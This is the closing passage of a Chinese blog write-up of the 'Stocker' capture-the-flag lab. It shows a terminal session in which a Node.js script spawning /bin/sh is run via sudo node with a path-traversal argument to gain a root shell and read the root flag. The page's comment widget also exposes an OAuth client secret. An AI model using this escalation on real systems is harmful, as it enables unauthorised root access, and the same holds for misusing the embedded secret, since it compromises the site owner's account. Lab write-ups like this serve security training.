+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">angoose@stocker:~$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;require(&quot;</span>child_process<span class="hljs-string">&quot;).spawn(&quot;</span>/bin/sh<span class="hljs-string">&quot;, &#123;stdio: [0, 1, 2]&#125;)&quot;</span> &gt; shell.js<br>angoose@stocker:~$ sudo /usr/bin/node /usr/local/scripts/../../../../home/angoose/shell.js<br>/home/angoose/shell.js:1<br>require(child_process).spawn(/bin/sh, &#123;stdio: [0, 1, 2]&#125;)<br>                             ^<br><br>SyntaxError: Invalid regular expression flags<br>    at Object.compileFunction (node:vm:360:18)<br>    at wrapSafe (node:internal/modules/cjs/loader:1088:15)<br>    at Module._compile (node:internal/modules/cjs/loader:1123:27)<br>    at Module._extensions..js (node:internal/modules/cjs/loader:1213:10)<br>    at Module.load (node:internal/modules/cjs/loader:1037:32)<br>    at Module._load (node:internal/modules/cjs/loader:878:12)<br>    at Function.executeUserEntryPoint [as runMain] (node:internal/modules/run_main:81:12)<br>    at node:internal/main/run_main_module:23:47<br><br>Node.js v18.12.1<br>angoose@stocker:~$ <span class="hljs-built_in">whoami</span><br>angoose<br>angoose@stocker:~$ <span class="hljs-built_in">id</span><br>uid=1001(angoose) gid=1001(angoose) <span class="hljs-built_in">groups</span>=1001(angoose)<br>angoose@stocker:~$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;require(&quot;child_process&quot;).spawn(&quot;/bin/sh&quot;, &#123;stdio: [0, 1, 2]&#125;)&#x27;</span> &gt; shell.js<br>angoose@stocker:~$ <span class="hljs-built_in">cat</span> shell.js<br>require(<span class="hljs-string">&quot;child_process&quot;</span>).spawn(<span class="hljs-string">&quot;/bin/sh&quot;</span>, &#123;stdio: [0, 1, 2]&#125;)<br>angoose@stocker:~$ sudo /usr/bin/node /usr/local/scripts/../../../../home/angoose/shell.js<br><span class="hljs-comment"># id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br><span class="hljs-comment"># whoami</span><br>root<br><span class="hljs-comment"># cat /root/root.txt</span><br></code></pre></td></tr></table></figure>
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/knowledge-database/" class="category-chain-item">knowledge_database</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Stocker靶机</div>
+      <div>https://i3eg1nner.github.io/2023/06/9690503462f3.html</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>I3eg1nner</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年6月8日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/06/fcf9aaa77e9b.html" title="Narak靶机">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Narak靶机</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/06/3f1f96829489.html" title="Soccer靶机">
+                        <span class="hidden-mobile">Soccer靶机</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="gitalk-container"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#gitalk-container', function() {
+      Fluid.utils.createCssLink('/css/gitalk.css')
+      Fluid.utils.createScript('https://lib.baomitu.com/gitalk/1.8.0/gitalk.min.js', function() {
+        var options = Object.assign(
+          {"clientID":"a14e9a13405642f51885","clientSecret":"5662f466deab58fdbbacd0ae3718eaf1625401dd","repo":"gitalk","owner":"I3eg1nner","admin":["I3eg1nner"],"language":"zh-CN","labels":["Gitalk"],"perPage":10,"pagerDirection":"last","distractionFreeMode":false,"createIssueManually":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token"},
+          {
+            id: '44f8eed634ae1f84e320427c8eba796f'
+          }
+        )
+        var gitalk = new Gitalk(options);
+        gitalk.render('gitalk-container');
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
